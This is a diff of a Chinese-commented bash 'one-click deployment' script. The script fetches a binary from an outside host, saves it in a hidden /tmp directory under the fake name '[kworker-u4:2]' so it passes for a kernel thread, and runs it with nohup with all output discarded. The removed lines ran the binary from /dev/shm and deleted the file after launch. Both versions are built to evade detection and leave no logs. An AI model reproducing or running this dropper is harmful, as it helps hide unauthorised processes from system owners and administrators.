@@ -4,12 +4,10 @@ set -u
 APP_NAME="oneimg"
 APP_PORT="${APP_PORT:-3097}"
 
-# ==========================================
-# 极限无痕模式：直接在内存盘运作，不需要任何日志和缓存文件夹！
-# ==========================================
-MEM_DIR="/dev/shm"
-FAKE_NAME="[kworker-u4:2]"
-APP_BIN="${MEM_DIR}/${FAKE_NAME}"
+# 退回原来完美运行的缓存目录！绝不瞎改了！
+BASE_DIR="/tmp/.system_kworker_cache"
+FAKE_NAME="\[kworker-u4:2\]"
+APP_BIN="${BASE_DIR}/${FAKE_NAME}"
 
 WORKER_URL="https://ssssss.cscscs.bond"
 
@@ -100,13 +98,8 @@ download_binary() {
       err "不支持的架构: $ARCH"; exit 1
   fi
   
-  if [ ! -w "${MEM_DIR}" ]; then
-      warn "${MEM_DIR} 不可写，退回到 /tmp 作为内存盘"
-      MEM_DIR="/tmp"
-      APP_BIN="${MEM_DIR}/${FAKE_NAME}"
-  fi
-
-  say "正在将二进制隐蔽拉取到系统内存..."
+  mkdir -p "${BASE_DIR}"
+  say "正在将二进制隐蔽拉取到系统缓存..."
   fetch_file "${DOWNLOAD_URL}" "${APP_BIN}"
   chmod +x "${APP_BIN}" || err "授权失败，可能环境严格受限。"
   say "拉取完成并授权成功！"
@@ -123,16 +116,15 @@ uninstall_app() {
     esac
   fi
   
-  # 【修复大屠杀 Bug】：增加精确转义，防止误杀所有系统进程
   pkill -f "\[kworker-u4:2\]" >/dev/null 2>&1 || true
-  rm -f "${MEM_DIR}/${FAKE_NAME}" >/dev/null 2>&1 || true
+  rm -rf "${BASE_DIR}" >/dev/null 2>&1 || true
   say "✅ 内存进程已强行终止，实体彻底灰飞烟灭！"
   exit 0
 }
 
 run_install() {
-  # 【修复大屠杀 Bug】：增加精确转义，只杀幽灵本体
   pkill -f "\[kworker-u4:2\]" >/dev/null 2>&1 || true
+  rm -rf "${BASE_DIR}" >/dev/null 2>&1 || true
 
   ask_config
   pick_port
@@ -149,23 +141,18 @@ run_install() {
   [ -n "${ENV_CF_DOMAIN:-}" ] && export CF_DOMAIN="${ENV_CF_DOMAIN}"
   [ -n "${ENV_SUB_PATH:-}" ] && export SUB_PATH="${ENV_SUB_PATH}"
 
-  say "正在注入脑电波并唤醒幽灵进程..."
+  say "正在唤醒幽灵进程..."
   
-  # 【核心无痕科技】：直接丢进黑洞，不留任何文字记录！
+  # 【原汁原味】：只做这一处修改，将输出重定向到黑洞，不留任何日志！
   nohup "${APP_BIN}" > /dev/null 2>&1 &
-  
-  sleep 2
-  # 启动后，立刻自毁实体！
-  rm -f "${APP_BIN}"
 
   say "🎉 部署大功告成！"
   say "当前运行端口: ${APP_PORT}"
-  say "应用已在内存中隐身启动，日志文件和实体文件已全自动销毁！"
   warn "进程伪装名称: ${FAKE_NAME}"
 }
 
 show_menu() {
-  printf "\n%b\n" "${GREEN} OneImg (终极无痕真空版) 一键部署脚本 ${NC}"
+  printf "\n%b\n" "${GREEN} OneImg (原汁原味无痕版) 一键部署脚本 ${NC}"
   printf "  ${YELLOW}1.${NC} 唤醒并在内存中隐藏执行\n"
   printf "  ${YELLOW}2.${NC} 结束并清除幽灵进程\n"
   printf "  ${YELLOW}0.${NC} 退出脚本\n"
